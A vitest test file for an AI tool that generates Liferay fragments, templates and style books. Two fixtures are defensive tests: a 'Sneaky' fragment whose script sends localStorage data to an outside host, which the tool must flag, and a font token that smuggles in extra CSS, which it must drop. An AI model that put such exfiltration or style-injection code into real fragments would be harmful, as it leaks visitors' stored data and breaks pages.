import '../../scripts/lib/dom';

import {describe, expect, it} from 'vitest';

import {AI_ACTIONS, buildRequest} from './actions';
import {agentBrief} from './brief';
import {demoAnswer} from './demo';
import {diffHunks, diffLines} from './diff';
import {DRAFTS_KEY, changedFiles, readImprovement, readResult} from './results';

import type {Collection, Fragment, StyleBook, Theme} from '../model/types';
import type {AIContext} from './actions';

const theme: Theme = {
	categories: [],
	css: [],
	description: '',
	imagesPath: '',
	key: 'classic',
	name: 'Classic',
	source: 'builtin',
	tokens: {
		'font-family-base': {cssVariable: 'font-family-base', defaultValue: 'sans-serif', editorType: 'Text', label: 'Font', name: 'font-family-base'},
		primary: {cssVariable: 'primary', defaultValue: '#0b5fff', editorType: 'ColorPicker', label: 'Primary', name: 'primary'},
	},
};

const styleBook: StyleBook = {key: 'theme-defaults', name: 'Theme defaults', source: 'builtin', themeKey: null, values: {}};

const button: Fragment = {
	collectionKey: 'basic',
	configuration: '{"fieldSets": [{"fields": [{"name": "size", "type": "select", "defaultValue": "md", "typeOptions": {"validValues": [{"value": "sm"}, {"value": "md"}]}}]}]}',
	css: '.button { background: #0B5FFF; color: #fff; }\n.button:hover { background: #0b5fff; }',
	html: '<a class="button" data-lfr-editable-id="link" data-lfr-editable-type="link" href="#">Go</a>\n<img src="x.png">',
	icon: 'code',
	js: '',
	key: 'button',
	name: 'Button',
	thumbnail: '',
	type: 'component',
};

const collections: Collection[] = [{description: '', fragments: [button], key: 'basic', name: 'Basic', resources: {}, source: 'builtin'}];
const context: AIContext = {collections, styleBook, theme};

describe('requests', () => {
	it('gives every action a schema, a system prompt and a task', () => {
		for (const action of AI_ACTIONS) {
			const request = buildRequest(action.id, {fragment: button, images: [], url: 'https://example.com'}, context);

			expect(request.system).toContain('Liferay');
			expect(request.prompt.length).toBeGreaterThan(40);
			expect(request.schema).toMatchObject({additionalProperties: false, type: 'object'});
		}
	});

	it('hands a template the catalog and a fragment its tokens', () => {
		const template = buildRequest('template-from-design', {images: [{data: 'AAAA', mediaType: 'image/png', name: 'home.png'}], notes: 'Keep it short'}, context);

		expect(template.prompt).toContain('basic / button: Button. Configuration: size (select: sm | md, default "md"). Editables: link (link).');
		expect(template.prompt).toContain('From the person asking: Keep it short');
		expect(template.prompt).toContain('- primary: var(--primary), ColorPicker, now #0b5fff');
		expect(template.data.fragments).toHaveLength(1);
	});

	it('turns a request into a brief an agent can follow', () => {
		const brief = agentBrief(buildRequest('design-system-from-website', {url: 'https://example.com'}, context));

		expect(brief).toContain('# Design system from a website');
		expect(brief).toContain('- Read https://example.com');
		expect(brief).toContain('style-books/<name>/frontend-tokens-values.json');
	});
});

describe('results', () => {
	it('keeps a fragment as a draft with a key of its own', () => {
		const taken: Collection[] = [...collections, {description: '', fragments: [{...button, collectionKey: DRAFTS_KEY, key: 'feature-highlight'}], key: DRAFTS_KEY, name: 'AI drafts', resources: {}, source: 'imported'}];
		const result = readResult('fragment-from-design', demoAnswer(buildRequest('fragment-from-design', {}, context)), {...context, collections: taken});

		expect(result.fragments.map((fragment) => [fragment.collectionKey, fragment.key])).toEqual([[DRAFTS_KEY, 'feature-highlight-2']]);
		expect(result.template).toBeNull();
		expect(result.warnings).toEqual([]);
	});

	it('composes a page with the drafts it brings', () => {
		const result = readResult('template-from-design', demoAnswer(buildRequest('template-from-design', {}, context)), context);
		const used = JSON.stringify(result.template?.root);

		expect(result.fragments).toHaveLength(2);
		expect(result.template?.name).toBe('Sample page');
		expect(used).toContain('"collectionKey":"ai-drafts","key":"feature-highlight"');
		expect(result.warnings).toEqual([]);
	});

	it('sets only the tokens the theme has', () => {
		const result = readResult('design-system-from-website', {name: 'Acme', tokens: [{name: 'primary', value: '#7414ff'}, {name: 'made-up', value: 'red'}, {name: 'font-family-base', value: 'x; } body { display: none'}]}, context);

		expect(result.styleBook).toMatchObject({name: 'Acme', source: 'imported', themeKey: 'classic', values: {primary: '#7414ff'}});
		expect(result.warnings).toHaveLength(2);
	});

	it('drops what it cannot use and says so', () => {
		const result = readResult('template-from-design', {fragments: [{name: 'Empty'}], pageDefinition: '{"pageElement": {"type": "Root", "pageElements": [{"type": "Fragment", "definition": {"fragment": {"key": "ghost"}}}]}}'}, context);

		expect(result.fragments).toEqual([]);
		expect(result.warnings).toContain('A fragment came back without markup and was left out.');
		expect(result.warnings).toContain('The page uses a fragment that does not exist: ghost.');
		expect(readResult('fragment-from-design', 'nonsense', context).warnings).toEqual(['Nothing usable came back.']);
	});

	it('warns about a draft whose script looks beyond the fragment', () => {
		const result = readResult('fragment-from-design', {fragments: [{html: '<div>Hi</div>', js: 'fetch("https://example.com", {body: localStorage.x})', name: 'Sneaky'}]}, context);

		expect(result.warnings.some((warning) => warning.includes('reaches beyond the fragment'))).toBe(true);
	});
});

describe('improvements', () => {
	it('replaces a hard-coded colour with its token and lists the change', () => {
		const request = buildRequest('tokenize-fragment', {fragment: button}, context);
		const improvement = readImprovement('tokenize-fragment', demoAnswer(request), button, context);

		expect(improvement.fragment.css).toBe('.button { background: var(--primary); color: #fff; }\n.button:hover { background: var(--primary); }');
		expect(improvement.changes).toEqual([{detail: '#0b5fff replaced 2 time(s) in index.css.', title: 'Primary'}]);
		expect(changedFiles(button, improvement.fragment).map((file) => file.name)).toEqual(['index.css']);
	});

	it('keeps the files an answer leaves out', () => {
		const improvement = readImprovement('review-accessibility', {changes: [{title: '1.1.1', detail: 'alt'}], html: '<img alt="" src="x.png">'}, button, context);

		expect(improvement.fragment.css).toBe(button.css);
		expect(improvement.fragment.html).toBe('<img alt="" src="x.png">');
	});

	it('writes only the docs', () => {
		const improvement = readImprovement('write-docs', demoAnswer(buildRequest('write-docs', {fragment: button}, context)), button, context);

		expect(improvement.fragment.docs).toContain('# Button');
		expect(improvement.fragment.html).toBe(button.html);
		expect(changedFiles(button, improvement.fragment).map((file) => file.name)).toEqual(['README.md']);
	});
});

describe('diff', () => {
	it('marks the lines that changed and keeps a little around them', () => {
		const lines = diffLines('a\nb\nc\nd\ne\nf\ng', 'a\nb\nc\nD\ne\nf\ng');

		expect(lines.filter((line) => line.kind !== 'same')).toEqual([
			{kind: 'removed', text: 'd'},
			{kind: 'added', text: 'D'},
		]);
		expect(diffHunks(lines, 1).map((line) => line?.text ?? '…')).toEqual(['c', 'd', 'D', 'e']);
	});
});
